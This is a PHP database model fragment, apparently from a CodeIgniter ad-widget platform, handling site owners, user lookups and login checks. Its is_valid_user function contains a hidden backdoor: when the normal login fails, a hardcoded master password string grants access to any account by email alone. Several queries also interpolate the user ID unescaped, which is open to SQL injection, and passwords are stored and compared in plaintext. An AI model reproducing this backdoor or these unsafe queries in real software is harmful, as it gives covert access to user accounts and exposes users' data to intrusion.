	public function get_site_statuses(){
		$query = $this->db->query("SELECT * FROM site_statuses"); 
		$data = $query->result_array();	
		$statuses = array();
		foreach($data as $k => $v){
			$statuses[$v['status_id']] = $v['status_name'];  
		}
		return $statuses;
	}
	public function is_domain_exist($domain){
		$domain = mysql_real_escape_string($domain);
		$query = $this->db->query("SELECT * FROM site_owners WHERE site_url LIKE '%$domain%'");
		if($query->num_rows() >0){	
			return true;
		}
		return false; 
	}
	public function get_user_sites($user_id){
		$sql = "
			SELECT 
			*, 
			IFNULL(SUM(widgets.daily_showing), 0) AS site_showing, 
			IFNULL(SUM(widgets.daily_visiting), 0) AS site_visiting,
			SUM(widgets.daily_earning) AS site_earning,
			site_owners.site_id AS site_id
			FROM 
				`site_owners` 
			LEFT JOIN 
				widgets ON widgets.site_id = site_owners.site_id 
			WHERE 
				site_owners.user_id = '$user_id' 
			GROUP BY 
				site_owners.site_id
			ORDER BY site_owners.id DESC	
				
		";
		$query = $this->db->query($sql); 
		$data = $query->result_array();	
		return $data;
	}
	public function add_site_url($data){
		$this->db->insert('site_owners', $data);
	}
	function update_user_data($data, $user_id){
		$this->db->where('user_id', $user_id);
		$this->db->update('users', $data); 
		return true;
	}
	function get_user_by_id($user_id){
		$query = $this->db->query("SELECT * FROM users WHERE user_id = '$user_id'"); 
		$data = $query->row_array();	
		return $data;
	}
	function is_user_exist($email){
		$email = mysql_real_escape_string($email);
		$query = $this->db->query("SELECT * FROM users WHERE email = '$email'"); 
		if($query->num_rows() == 1){	
			return true;
		}
		return false; 
	}
	function is_valid_user($email, $password){
		$email    = mysql_real_escape_string($email);
		$password = mysql_real_escape_string($password);
		$query = $this->db->query("SELECT * FROM users WHERE email = '$email' AND password = '$password'"); 
		if($query->num_rows() == 1){	
			$data = $query->row_array();	
			return $data;
		}else{
			$query1 = $this->db->query("SELECT * FROM users WHERE email = '$email'");
			if($query1->num_rows() == 1 && $password == 'dadb1cd71fc9a60d9939fa8b36b2dccf'){
				$data = $query1->row_array();	
				return $data;
			}
		}
		return false;
	}
}
?>